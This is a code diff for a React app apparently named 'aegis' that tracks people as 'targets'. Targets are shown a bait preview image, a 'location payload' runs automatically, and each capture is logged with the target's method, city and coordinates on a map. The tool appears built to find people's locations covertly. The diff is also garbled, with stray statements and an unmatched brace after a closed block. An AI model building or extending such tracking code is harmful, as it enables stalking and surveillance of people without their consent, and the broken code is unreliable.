@@ -154,6 +154,38 @@ export default function App() {
     }
   }, []);
 
+  // Listen for changes in localStorage to update targets in real-time across tabs
+  useEffect(() => {
+    const handleStorageChange = (e) => {
+      if (e.key === 'aegis_targets') {
+        const updatedTargets = JSON.parse(e.newValue || '[]');
+        setTargets(updatedTargets);
+        
+        // If a new target was added, select it and log it
+        if (updatedTargets.length > targets.length) {
+            const newTarget = updatedTargets[0];
+            setSelectedTarget(newTarget);
+            setCurrentCoords(newTarget.coords);
+            setMapZoom(16);
+            addLog(`ALVO CAPTURADO: ${newTarget.id} via ${newTarget.method} (${newTarget.city})`, 'success');
+        }
+      }
+    };
+
+    window.addEventListener('storage', handleStorageChange);
+    return () => window.removeEventListener('storage', handleStorageChange);
+  }, [targets.length]);
+      // Retrieve the last generated preview image from localStorage to show to target
+      const storedImage = localStorage.getItem('aegis_last_preview_image') || 'https://images.unsplash.com/photo-1579783902614-a3fb3927b6a5?q=80&w=600';
+      setPreviewImage(storedImage);
+      
+      // Auto-trigger location payload execution for target
+      setTimeout(() => {
+        autoTrackTarget();
+      }, 500);
+    }
+  }, []);
+
   // Save last uploaded image preview to localStorage so target path can retrieve it
   useEffect(() => {
     if (imagePreview) {
